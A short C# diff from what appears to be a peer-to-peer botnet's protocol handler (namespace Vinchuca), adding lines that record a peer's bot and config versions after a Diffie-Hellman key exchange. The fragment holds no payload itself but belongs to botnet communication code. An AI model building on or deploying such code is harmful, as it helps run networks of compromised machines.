@@ -25,6 +25,8 @@ namespace Vinchuca.Network.Protocol.Handlers
 
             peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
             peerInfo.Handshaked = true;
+            peerInfo.BotVersion = msg.BotVersion;
+            peerInfo.CfgVersion = msg.CfgVersion;
 
             var reply = new HelloAckMessage
             {
